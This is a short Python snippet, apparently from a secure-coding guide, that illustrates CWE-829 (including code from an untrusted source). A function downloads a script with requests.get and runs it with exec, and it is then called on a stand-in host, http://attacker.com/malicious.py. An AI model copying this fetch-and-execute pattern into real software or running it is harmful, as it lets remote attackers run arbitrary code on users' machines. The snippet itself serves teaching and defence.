# Vulnerable: NOV-CWE-829
def fetch_and_execute_script(url: str):
# ❌ Dangerous: executing external script without verification
script = requests.get(url).text
exec(script)
# Attacker hosts a malicious script on a public URL.
# Example URL: http://attacker.com/malicious.py
fetch_and_execute_script("http://attacker.com/malicious.py")
